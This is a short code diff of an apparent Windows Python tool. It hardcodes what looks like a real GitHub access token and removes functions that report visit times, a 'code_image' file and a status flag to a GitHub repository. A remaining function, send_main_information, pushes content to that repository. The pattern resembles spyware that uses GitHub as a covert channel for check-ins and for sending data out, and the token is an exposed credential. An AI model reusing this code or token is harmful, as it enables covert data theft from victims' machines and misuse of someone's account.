@@ -13,7 +13,7 @@ import win32api
 import zipfile
 
 # _____(end import)_____ #
-TOKEN = ''
+TOKEN = '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'
 chdir(getcwd())
 # _____(function)_____ #
 try:
@@ -38,29 +38,6 @@ try:
         except:pass
 
     #__________(deleted)__________#
-    def last_visit(TOKEN):
-        time = datetime.now()
-        with open(file="last_visit.ini", mode="w") as f:
-            f.write(f"{time}")
-        g = Github(TOKEN)
-        repo = g.get_user().get_repo("python")
-        file = repo.get_dir_contents("last_visit.ini")
-        repo.update_file("last_visit.ini", "visit", f"{time}", sha=file.sha)
-
-
-    def code_image(TOKEN):
-        with open(file="code_image.ini", mode="r") as f:
-            g = Github(TOKEN)
-            repo = g.get_user().get_repo("python")
-            file = repo.get_dir_contents("code_image.ini")
-            repo.update_file("code_image.ini", "image", f"{f.read()}", sha=file.sha)
-
-
-    def send_condition(TOKEN):
-        g = Github(TOKEN)
-        repo = g.get_user().get_repo("python")
-        file = repo.get_dir_contents("result_condition.ini")
-        repo.update_file("result_condition.ini", "condition", "result_condition = False", sha=file.sha)
     # __________(deleted)__________#
 
     def send_main_information(TOKEN, content, name_file_to_site):
